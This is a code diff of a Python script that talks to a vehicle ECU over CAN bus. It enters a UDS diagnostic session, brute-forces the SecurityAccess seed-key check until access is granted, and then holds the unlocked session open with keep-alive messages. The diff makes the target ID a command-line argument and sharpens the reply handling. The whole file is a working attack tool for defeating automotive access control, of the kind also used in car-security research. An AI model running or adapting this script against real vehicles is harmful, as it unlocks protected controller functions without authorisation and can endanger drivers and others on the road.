@@ -5,16 +5,15 @@ import time
 
 Bus0 = can.interface.Bus(bustype='socketcan', channel='can0', bitrate=49500)
 
-SendAID = 0x7D3
-RecvAID = SendAID+8
+def createMessages():
+    global ModeEnable, RequestSeed, KeepAlive
+    ModeEnable = can.Message(arbitration_id=SendAID, data=[0x02, 0x10, 0x02, 0,0,0,0,0], extended_id=False)
+    RequestSeed = can.Message(arbitration_id=SendAID, data=[0x02, 0x27, 0x01, 0,0,0,0,0], extended_id=False)
+    KeepAlive = can.Message(arbitration_id=SendAID, data=[0x02, 0x3e, 0x00, 0,0,0,0,0], extended_id=False)
 
-ModeEnable = can.Message(arbitration_id=SendAID, data=[0x02, 0x10, 0x02, 0,0,0,0,0], extended_id=False)
-RequestSeed = can.Message(arbitration_id=SendAID, data=[0x02, 0x27, 0x01, 0,0,0,0,0], extended_id=False)
-KeepAlive = can.Message(arbitration_id=SendAID, data=[0x02, 0x3e, 0x00, 0,0,0,0,0], extended_id=False)
-
-def getReply(aid):
+def getReply(aid, pid):
     t = 0
-    while (t<20):
+    while (t<50):
         msg = Bus0.recv(0)
         if (msg==None):
             t += 1
@@ -22,7 +21,10 @@ def getReply(aid):
             continue
         if (msg.arbitration_id != RecvAID):
             continue
-        return msg
+        if (msg.data[1] == pid+0x40):
+            return msg
+        if (msg.data[1] == 0x7f and msg.data[2] == pid):
+            return msg
     return None
 
 def deriveKey(seed, modifier):
@@ -33,10 +35,11 @@ def deriveKey(seed, modifier):
 
 def pinAccess():
     while (True):
+        sys.stdout.write('.')
         time.sleep(10)
         Bus0.send(KeepAlive)
 
-def brute_force_key():
+def bruteForceKey():
     # Note: hit with f1bc -> f287
     print("Forcing Time!")
     modifier = 0
@@ -44,7 +47,7 @@ def brute_force_key():
         modifier += 1
 
         Bus0.send(RequestSeed)
-        msg = getReply(RecvAID)
+        msg = getReply(RecvAID, 0x27)
         print(msg)
 
         if (msg.data[0:3] != bytearray([0x04, 0x67, 0x01])):
@@ -58,7 +61,7 @@ def brute_force_key():
         print(reply)
 
         Bus0.send(reply)
-        msg = getReply(RecvAID)
+        msg = getReply(RecvAID, 0x27)
         print(msg)
 
         if (msg.data[0:4] == bytearray([0x03, 0x7f, 0x27, 0x35])):
@@ -66,14 +69,14 @@ def brute_force_key():
             continue
         elif (msg.data[0:3] == bytearray([0x02, 0x67, 0x02])):
             print("Access Granted.")
-            pinAccess()
+            return True
         else:
             print(''.join('{:02x}'.format(x) for x in msg.data))
             break
 
 def switchMode():
     Bus0.send(ModeEnable)
-    msg = getReply(RecvAID)
+    msg = getReply(RecvAID, 0x10)
     if (msg == None):
         return False
     if (msg.data != bytearray([0x02, 0x50, 0x02, 0,0,0,0,0])):
@@ -82,9 +85,25 @@ def switchMode():
     return True
 
 if __name__ == "__main__":
+    if (len(sys.argv) < 2):
+        print("Usage:",sys.argv[0],"<AID>")
+        exit(1)
+    else:
+        SendAID = int(sys.argv[1],0)
+        RecvAID = SendAID+8
+        createMessages()
+
+    print("using aid:",hex(SendAID))
+
     print("switching mode...")
     if (not switchMode()):
-        print("failed.")
-        exit(1)
-    brute_force_key()
+        print("mode-switch failed.")
+        exit(2)
+
+    if (not bruteForceKey()):
+        print("brute-force failed.")
+        exit(3)
+
+    sys.stdout.write('Pinning')
+    pinAccess()
 
